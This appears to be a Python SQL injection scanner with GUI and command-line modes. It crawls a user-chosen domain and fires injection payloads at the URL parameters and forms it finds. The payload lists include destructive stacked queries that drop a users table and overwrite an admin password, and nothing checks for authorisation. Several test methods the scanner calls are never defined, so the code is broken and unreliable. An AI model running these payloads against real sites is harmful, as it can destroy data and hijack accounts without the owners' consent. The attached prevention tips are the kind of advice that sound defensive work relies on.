import tkinter as tk
from tkinter import scrolledtext, messagebox
import requests
import time
import subprocess
import threading
import validators
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Banner
def print_banner():
    print(Fore.GREEN + """
 ____   ___  _     _ ____                                  
/ ___| / _ \| |   (_) ___|  ___ __ _ _ __  _ __   ___ _ __ 
\___ \| | | | |   | \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
 ___) | |_| | |___| |___) | (_| (_| | | | | | | |  __/ |   
|____/ \__\_\_____|_|____/ \___\__,_|_| |_|_| |_|\___|_|   
        coded by Komal Sharma
""" + Style.RESET_ALL)

# Prevention Tips with Detailed Explanations
PREVENTION_TIPS = {
    "error-based": [
        "1. Use Parameterized Queries or Prepared Statements:",
        "   - Always use parameterized queries or prepared statements to separate SQL code from user input.",
        "   - Example (Python with SQLite):",
        "     ```python",
        "     cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))",
        "     ```",
        "2. Validate and Sanitize All User Inputs:",
        "   - Validate input data to ensure it matches expected formats (e.g., email, phone number).",
        "   - Sanitize inputs to remove or escape special characters that could be used in SQL injection.",
        "3. Implement Proper Error Handling:",
        "   - Avoid displaying detailed database error messages to users.",
        "   - Log errors on the server side for debugging purposes.",
        "4. Use a Web Application Firewall (WAF):",
        "   - Deploy a WAF to filter out malicious SQL injection attempts.",
        "   - Examples: ModSecurity, Cloudflare WAF.",
        "5. Regularly Update and Patch Software:",
        "   - Keep your database, web server, and application frameworks up to date.",
        "   - Apply security patches as soon as they are released.",
    ],
    "boolean-based": [
        "1. Use Parameterized Queries or Prepared Statements:",
        "   - Prevent attackers from manipulating SQL queries by using parameterized queries.",
        "   - Example (Python with MySQL):",
        "     ```python",
        "     cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (username, password))",
        "     ```",
        "2. Validate and Sanitize All User Inputs:",
        "   - Ensure inputs are validated and sanitized before being used in SQL queries.",
        "3. Use a Web Application Firewall (WAF):",
        "   - Deploy a WAF to detect and block boolean-based SQL injection attempts.",
        "4. Implement Proper Error Handling:",
        "   - Avoid revealing database structure or query logic through error messages.",
        "5. Regularly Update and Patch Software:",
        "   - Keep all software components up to date to mitigate known vulnerabilities.",
    ],
    "time-based": [
        "1. Use Parameterized Queries or Prepared Statements:",
        "   - Prevent time-based SQL injection by using parameterized queries.",
        "2. Validate and Sanitize All User Inputs:",
        "   - Ensure inputs are validated and sanitized before being used in SQL queries.",
        "3. Implement Rate Limiting:",
        "   - Limit the number of requests from a single IP address to prevent time-based attacks.",
        "4. Use a Web Application Firewall (WAF):",
        "   - Deploy a WAF to detect and block time-based SQL injection attempts.",
        "5. Regularly Update and Patch Software:",
        "   - Keep all software components up to date to mitigate known vulnerabilities.",
    ],
    "union-based": [
        "1. Use Parameterized Queries or Prepared Statements:",
        "   - Prevent UNION-based SQL injection by using parameterized queries.",
        "2. Validate and Sanitize All User Inputs:",
        "   - Ensure inputs are validated and sanitized before being used in SQL queries.",
        "3. Restrict Database Permissions:",
        "   - Limit database user permissions to prevent UNION-based attacks.",
        "4. Use a Web Application Firewall (WAF):",
        "   - Deploy a WAF to detect and block UNION-based SQL injection attempts.",
        "5. Regularly Update and Patch Software:",
        "   - Keep all software components up to date to mitigate known vulnerabilities.",
    ],
    "stacked-queries": [
        "1. Use Parameterized Queries or Prepared Statements:",
        "   - Prevent stacked queries by using parameterized queries.",
        "2. Validate and Sanitize All User Inputs:",
        "   - Ensure inputs are validated and sanitized before being used in SQL queries.",
        "3. Disable Stacked Queries:",
        "   - Disable support for stacked queries in your database configuration.",
        "4. Use a Web Application Firewall (WAF):",
        "   - Deploy a WAF to detect and block stacked query attempts.",
        "5. Regularly Update and Patch Software:",
        "   - Keep all software components up to date to mitigate known vulnerabilities.",
    ],
}

# GUI Application
class SQLiScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("UltraProMax Advanced SQLi Scanner")
        self.root.geometry("800x600")

        # Domain Input
        self.domain_label = tk.Label(root, text="Enter Target Domain (e.g., example.com):")
        self.domain_label.pack(pady=5)
        self.domain_entry = tk.Entry(root, width=50)
        self.domain_entry.pack(pady=5)

        # Verbose Mode Checkbox
        self.verbose_var = tk.BooleanVar()
        self.verbose_check = tk.Checkbutton(root, text="Enable Verbose Mode", variable=self.verbose_var)
        self.verbose_check.pack(pady=5)

        # Threads Input
        self.threads_label = tk.Label(root, text="Number of Threads (default 10):")
        self.threads_label.pack(pady=5)
        self.threads_entry = tk.Entry(root, width=10)
        self.threads_entry.insert(0, "10")
        self.threads_entry.pack(pady=5)

        # Delay Input
        self.delay_label = tk.Label(root, text="Delay Between Requests (default 1 second):")
        self.delay_label.pack(pady=5)
        self.delay_entry = tk.Entry(root, width=10)
        self.delay_entry.insert(0, "1")
        self.delay_entry.pack(pady=5)

        # Start Scan Button
        self.scan_button = tk.Button(root, text="Start Scan", command=self.start_scan)
        self.scan_button.pack(pady=10)

        # Results Display
        self.results_label = tk.Label(root, text="Scan Results:")
        self.results_label.pack(pady=5)
        self.results_text = scrolledtext.ScrolledText(root, width=100, height=20)
        self.results_text.pack(pady=5)

    def start_scan(self):
        # Get inputs from GUI
        domain = self.domain_entry.get()
        verbose = self.verbose_var.get()
        threads = int(self.threads_entry.get())
        delay = float(self.delay_entry.get())

        # Clear previous results
        self.results_text.delete(1.0, tk.END)

        # Initialize scanner
        self.scanner = UltraProMaxAdvancedSQLiScanner(domain, verbose=verbose, threads=threads, delay=delay)
        self.scanner.discover_parameters_and_forms()

        # Run scan in a separate thread to avoid freezing the GUI
        scan_thread = threading.Thread(target=self.run_scan)
        scan_thread.start()

    def run_scan(self):
        self.scanner.scan()
        self.display_results()

    def display_results(self):
        # Display results in the GUI
        if not self.scanner.results:
            self.results_text.insert(tk.END, "No vulnerabilities detected.\n")
        else:
            for result in self.scanner.results:
                self.results_text.insert(tk.END, f"URL: {result['url']}\n")
                if result["parameter"]:
                    self.results_text.insert(tk.END, f"Parameter: {result['parameter']}\n")
                self.results_text.insert(tk.END, f"Payload: {result['payload']}\n")
                self.results_text.insert(tk.END, f"Type: {result['type']}\n")
                self.results_text.insert(tk.END, f"Severity: {result['severity']}\n")
                self.results_text.insert(tk.END, f"Confidence: {result['confidence'] * 100:.2f}%\n")
                self.results_text.insert(tk.END, "-" * 50 + "\n")

                # Map vulnerability type to the correct key in PREVENTION_TIPS
                payload = result["payload"]
                if "OR '1'='1" in payload or "OR 'a'='a" in payload:
                    mapped_type = "boolean-based"
                elif "UNION SELECT" in payload:
                    mapped_type = "union-based"
                elif "ORDER BY" in payload:
                    mapped_type = "error-based"
                elif "SLEEP" in payload:
                    mapped_type = "time-based"
                elif "DROP TABLE" in payload or "UPDATE" in payload:
                    mapped_type = "stacked-queries"
                else:
                    mapped_type = "error-based"  # Default to error-based if no match is found

                # Show prevention tips
                self.results_text.insert(tk.END, "Prevention Tips:\n")
                if mapped_type in PREVENTION_TIPS:
                    for tip in PREVENTION_TIPS[mapped_type]:
                        self.results_text.insert(tk.END, f"- {tip}\n")
                else:
                    self.results_text.insert(tk.END, "- No specific prevention tips available for this type of vulnerability.\n")
                self.results_text.insert(tk.END, "\n")

        # Show a popup when the scan is complete
        messagebox.showinfo("Scan Complete", "The SQL injection scan has finished.")

# SQL Injection Scanner Class
class UltraProMaxAdvancedSQLiScanner:
    def __init__(self, domain, verbose=False, threads=10, delay=1):
        self.domain = domain
        self.vulnerable = False
        self.session = requests.Session()
        self.time_delay = 5  # Time delay for time-based SQL injection detection
        self.discovered_urls = []
        self.discovered_forms = []
        self.results = []
        self.verbose = verbose
        self.threads = threads
        self.delay = delay  # Delay between requests
        self.lock = threading.Lock()
        self.database_type = None  # Detected database type

    def discover_parameters_and_forms(self):
        print(f"{Fore.CYAN}[*] Discovering URLs, parameters, and forms for {self.domain}...{Style.RESET_ALL}")

        # Try using waybackurls first
        if self.is_tool_installed("waybackurls"):
            print(f"{Fore.GREEN}[+] waybackurls is installed. Using it to discover URLs...{Style.RESET_ALL}")
            if self.run_waybackurls():
                print(f"{Fore.GREEN}[+] Discovered {len(self.discovered_urls)} URLs with parameters using waybackurls.{Style.RESET_ALL}")

        # Crawl the website to discover forms
        self.crawl_website()

    def is_tool_installed(self, tool_name):
        """Check if a tool is installed and accessible."""
        try:
            subprocess.run([tool_name, "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except FileNotFoundError:
            return False

    def run_waybackurls(self):
        try:
            # Run waybackurls to discover URLs
            result = subprocess.run(["waybackurls", self.domain], capture_output=True, text=True)
            if result.returncode != 0:
                return False

            # Extract URLs from waybackurls output
            urls = result.stdout.splitlines()
            self.discovered_urls = [url for url in urls if "?" in url and validators.url(url)]  # Filter valid URLs with parameters
            return True
        except FileNotFoundError:
            return False

    def crawl_website(self):
        print(f"{Fore.CYAN}[*] Crawling {self.domain} to discover forms...{Style.RESET_ALL}")
        try:
            response = self.session.get(f"http://{self.domain}")
            soup = BeautifulSoup(response.text, "html.parser")

            # Find all forms on the page
            for form in soup.find_all("form"):
                form_action = form.get("action")
                form_method = form.get("method", "get").lower()
                form_inputs = []
                for input_tag in form.find_all("input"):
                    input_name = input_tag.get("name")
                    if input_name:
                        form_inputs.append(input_name)

                if form_action and form_inputs:
                    form_url = urljoin(f"http://{self.domain}", form_action)
                    if validators.url(form_url):  # Validate form URL
                        self.discovered_forms.append({
                            "url": form_url,
                            "method": form_method,
                            "inputs": form_inputs,
                        })

            print(f"{Fore.GREEN}[+] Discovered {len(self.discovered_forms)} forms.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error crawling website: {e}{Style.RESET_ALL}")

    def scan(self):
        if not self.discovered_urls and not self.discovered_forms:
            print(f"{Fore.RED}[-] No URLs or forms with parameters found. Exiting.{Style.RESET_ALL}")
            return

        print(f"{Fore.CYAN}[*] Scanning for SQL injection vulnerabilities...{Style.RESET_ALL}")

        # Scan URLs with parameters
        threads = []
        for url in self.discovered_urls:
            thread = threading.Thread(target=self.test_url, args=(url,))
            threads.append(thread)
            thread.start()
            time.sleep(self.delay)  # Add delay between requests

        # Scan forms
        for form in self.discovered_forms:
            thread = threading.Thread(target=self.test_form, args=(form,))
            threads.append(thread)
            thread.start()
            time.sleep(self.delay)  # Add delay between requests

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

        if not self.vulnerable:
            print(f"{Fore.GREEN}[+] No SQL injection vulnerabilities detected.{Style.RESET_ALL}")

    def test_url(self, url):
        if not self.verbose:
            print(f"{Fore.CYAN}[*] Testing URL: {url}{Style.RESET_ALL}")

        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)

        # Skip external URLs
        if parsed_url.netloc != self.domain:
            return

        # Test all parameters
        self.test_error_based(url, params)
        self.test_boolean_based(url, params)
        self.test_time_based(url, params)
        self.test_union_based(url, params)
        self.test_stacked_queries(url, params)

    def test_form(self, form):
        payloads = self.generate_payloads("form-based")
        for payload in payloads:
            try:
                form_data = {input_name: payload for input_name in form["inputs"]}
                if form["method"] == "get":
                    response = self.session.get(form["url"], params=form_data, timeout=10)
                else:
                    response = self.session.post(form["url"], data=form_data, timeout=10)

                if self.is_vulnerable(response):
                    confidence = self.calculate_confidence(response, payload)
                    severity = self.determine_severity(confidence, "form-based")
                    with self.lock:
                        self.report_vulnerability(form["url"], None, payload, "form-based", severity, confidence, response)
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[-] Error testing form at URL {form['url']}: {e}{Style.RESET_ALL}")

    def generate_payloads(self, payload_type):
        """Generate payloads based on the type of SQL injection."""
        payloads = []
        if payload_type == "error-based":
            payloads = [
                "' OR '1'='1",
                "' OR '1'='1' --",
                '" OR "1"="1',
                '" OR "1"="1" --',
                "1' ORDER BY 1--",
                "1' UNION SELECT null--",
                "1' UNION SELECT null,null--",
                "1' UNION SELECT null,null,null--",
                "1' AND 1=CONVERT(int, (SELECT @@version))--",
                "1' AND 1=CAST((SELECT @@version) AS int)--",
                "1' OR 1=1--",
                "1' OR 1=1#",
                "1' OR 1=1/*",
                "1' OR 'a'='a",
                "1' OR 'a'='a' --",
                "1' OR 'a'='a'#",
                "1' OR 'a'='a'/*",
            ]
        elif payload_type == "form-based":
            payloads = [
                "' OR '1'='1",
                "' OR '1'='1' --",
                '" OR "1"="1',
                '" OR "1"="1" --',
                "1' ORDER BY 1--",
                "1' UNION SELECT null--",
            ]
        elif payload_type == "union-based":
            payloads = [
                "1' UNION SELECT null--",
                "1' UNION SELECT null,null--",
                "1' UNION SELECT null,null,null--",
                "1' UNION SELECT @@version--",
                "1' UNION SELECT user(),database()--",
            ]
        elif payload_type == "stacked-queries":
            payloads = [
                "'; DROP TABLE users--",
                "'; UPDATE users SET password='hacked' WHERE user='admin'--",
            ]
        return payloads

    def is_vulnerable(self, response):
        # Check for common SQL error messages in the response
        errors = [
            "sql syntax",
            "mysql_fetch",
            "syntax error",
            "unexpected token",
            "mysql error",
            "sqlite3 error",
            "postgresql error",
            "oracle error",
            "microsoft sql server",
            "odbc driver",
            "pdo exception",
            "sql command not properly ended",
            "sqlite exception",
        ]
        return any(error in response.text.lower() for error in errors)

    def calculate_confidence(self, response, payload):
        """Calculate confidence score based on response analysis."""
        confidence = 0.0

        # Check for SQL error messages
        errors = [
            "sql syntax",
            "mysql_fetch",
            "syntax error",
            "unexpected token",
            "mysql error",
            "sqlite3 error",
            "postgresql error",
            "oracle error",
            "microsoft sql server",
            "odbc driver",
            "pdo exception",
            "sql command not properly ended",
            "sqlite exception",
        ]
        if any(error in response.text.lower() for error in errors):
            confidence += 0.5

        # Check for payload reflection in response
        if payload in response.text:
            confidence += 0.3

        # Check for unusual response length
        if len(response.text) > 10000:  # Arbitrary threshold
            confidence += 0.2

        return min(confidence, 1.0)  # Cap confidence at 1.0

    def determine_severity(self, confidence, vulnerability_type):
        """Determine severity based on confidence and vulnerability type."""
        if confidence >= 0.9:
            return "Critical"
        elif confidence >= 0.7:
            return "High"
        elif confidence >= 0.5:
            return "Medium"
        elif confidence >= 0.3:
            return "Low"
        else:
            return "Info"

    def report_vulnerability(self, url, parameter, payload, vulnerability_type, severity, confidence, response):
        """Report a vulnerability in a structured format."""
        self.vulnerable = True
        self.results.append({
            "url": url,
            "parameter": parameter,
            "payload": payload,
            "type": vulnerability_type,
            "severity": severity,
            "confidence": confidence,
            "response": response.text[:200] + "...",
        })

        print(f"\n{Fore.RED}[!] {severity} severity SQL injection vulnerability detected!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}URL: {url}{Style.RESET_ALL}")
        if parameter:
            print(f"{Fore.YELLOW}Parameter: {parameter}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Payload: {payload}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Type: {vulnerability_type}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Confidence: {confidence * 100:.2f}%{Style.RESET_ALL}")
        if self.verbose:
            print(f"{Fore.YELLOW}Response: {response.text[:200]}...{Style.RESET_ALL}")

        # Map vulnerability type to the correct key in PREVENTION_TIPS
        if "OR '1'='1" in payload or "OR 'a'='a" in payload:
            mapped_type = "boolean-based"
        elif "UNION SELECT" in payload:
            mapped_type = "union-based"
        elif "ORDER BY" in payload:
            mapped_type = "error-based"
        elif "SLEEP" in payload:
            mapped_type = "time-based"
        elif "DROP TABLE" in payload or "UPDATE" in payload:
            mapped_type = "stacked-queries"
        else:
            mapped_type = "error-based"  # Default to error-based if no match is found

        # Show prevention tips
        print(f"{Fore.GREEN}[+] Prevention Tips:{Style.RESET_ALL}")
        if mapped_type in PREVENTION_TIPS:
            for tip in PREVENTION_TIPS[mapped_type]:
                print(f"{Fore.GREEN}- {tip}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}- No specific prevention tips available for this type of vulnerability.{Style.RESET_ALL}")

# Main Application
if __name__ == "__main__":
    print_banner()
    mode = input(f"{Fore.CYAN}Choose mode (cli/gui): {Style.RESET_ALL}").strip().lower()

    if mode == "cli":
        domain = input(f"{Fore.CYAN}Enter the target domain (e.g., example.com): {Style.RESET_ALL}")
        verbose = input(f"{Fore.CYAN}Enable verbose mode? (yes/no): {Style.RESET_ALL}").strip().lower() == "yes"
        threads = int(input(f"{Fore.CYAN}Enter the number of threads (default 10): {Style.RESET_ALL}") or 10)
        delay = float(input(f"{Fore.CYAN}Enter the delay between requests (default 1 second): {Style.RESET_ALL}") or 1)
        scanner = UltraProMaxAdvancedSQLiScanner(domain, verbose=verbose, threads=threads, delay=delay)
        scanner.discover_parameters_and_forms()
        scanner.scan()
    elif mode == "gui":
        root = tk.Tk()
        app = SQLiScannerGUI(root)
        root.mainloop()
    else:
        print(f"{Fore.RED}[-] Invalid mode selected. Exiting.{Style.RESET_ALL}")
